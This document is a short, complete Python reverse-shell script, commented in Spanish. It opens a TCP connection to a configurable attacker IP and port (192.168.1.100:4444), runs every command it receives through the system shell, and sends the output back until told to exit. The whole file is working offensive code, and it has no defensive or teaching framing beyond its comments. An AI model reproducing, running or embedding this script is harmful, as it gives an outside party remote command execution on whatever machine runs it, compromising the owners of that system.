#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import os

# Configura la dirección IP y puerto del atacante
# Cambia estos valores según tu configuración
IP_ATACANTE = '192.168.1.100'  # Dirección IP donde escucha el atacante
PUERTO_ATACANTE = 4444         # Puerto donde escucha el atacante

def conectar():
    """Establece una conexión TCP con el atacante"""
    try:
        # Crear un socket TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Conectarse al atacante
        s.connect((IP_ATACANTE, PUERTO_ATACANTE))
        return s
    except Exception as e:
        print(f"Error al conectar: {e}")
        return None

def shell(s):
    """Ejecuta comandos recibidos del atacante y devuelve la salida"""
    while True:
        try:
            # Recibir comando del atacante (máximo 1024 bytes)
            comando = s.recv(1024).decode('utf-8').strip()

            # Si el comando es 'exit', cerrar la conexión
            if comando.lower() == 'exit':
                s.send(b'Saliendo...\n')
                break

            # Ejecutar el comando en el sistema (shell=True permite comandos complejos)
            resultado = subprocess.run(
                comando,
                shell=True,
                capture_output=True,
                text=True
            )

            # Enviar la salida estándar o error de vuelta al atacante
            salida = resultado.stdout + resultado.stderr
            s.send(salida.encode('utf-8'))

        except Exception as e:
            error_msg = f"Error al ejecutar comando: {e}\n"
            s.send(error_msg.encode('utf-8'))

def main():
    """Función principal que inicia la conexión y la shell"""
    s = conectar()
    if s:
        shell(s)
        s.close()

if __name__ == '__main__':
    main()